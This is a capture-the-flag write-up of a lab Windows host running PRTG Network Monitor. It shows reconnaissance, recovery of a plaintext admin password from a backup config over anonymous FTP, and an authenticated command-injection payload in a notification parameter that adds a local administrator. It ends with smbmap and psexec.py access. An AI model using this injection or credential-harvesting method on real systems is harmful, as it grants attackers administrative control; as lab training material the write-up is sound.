1,Recon
port scan
```
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_11-10-23  09:20AM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-16T11:30:14
|_  start_date: 2024-12-16T11:19:12
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

To be honest, when I found the port 445 service and the version of system `Microsoft Windows Server 2008 R2 - 2012 microsoft-ds`
I can only think about `EternalBlue`.But it seems like no vulner here.

Page check
port 80
![](images/Pasted%20image%2020241216065906.png)
I’ll grab the three config files and look through them. When I see places in the .dat file and the .old file that might have passwords, it always looks like this:
```
 <dbpassword>
              <flags>
                <encrypted/>
              </flags>
</dbpassword>
```
However, in PRTG Configuration.old.bak, I find this:
```
<dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
</dbpassword>
```

Now that I have creds, I can try to log in. Unfortunately, trying the creds from the bak file returns:
![](images/Pasted%20image%2020241216071705.png)
However, on thinking a minute, the creds are from the backup of an old file, and end in “2018”. I’ll try 2019, and it works, bringing me to the PRTG dashboard for System Administrator:
![](images/Pasted%20image%2020241216071717.png)

By searching the version of PRTG 
`PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution`
There is a blog about command injection in PTRG `https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/` 

I’ll follow the post, and go to Setup > Account Settings > Notifications:
![](images/Pasted%20image%2020241216073638.png)

On the very right, I’ll hit the plus, and then “Add new notification”. Leaving everything else unchanged, I’ll scroll down to the bottom and select “Execute Program”. The injection is in the Parameter. I’ll select the demo ps1 file for the program file, and then enter `test.txt;net user anon p3nT3st! /add;net localgroup administrators anon /add`:

On hitting save, I’m back at the list of notifications. I’ll click the box next to my new on, and then the top icon of the bell to test the notification:
![](images/Pasted%20image%2020241216073909.png)

After waiting a few seconds, I’ll run smbmap with my new user, and see I have full access:
```
smbmap -H 10.10.10.152 -u anon -p "p3nT3st\!"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.10.152:445        Name: 10.10.10.152              Status: ADMIN!!!   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
[*] Closed 1 connections                                                                   
```

We can also use `psexec.py` to get the shell
`psexec.py 'anon:p3nT3st!@10.10.10.152'`
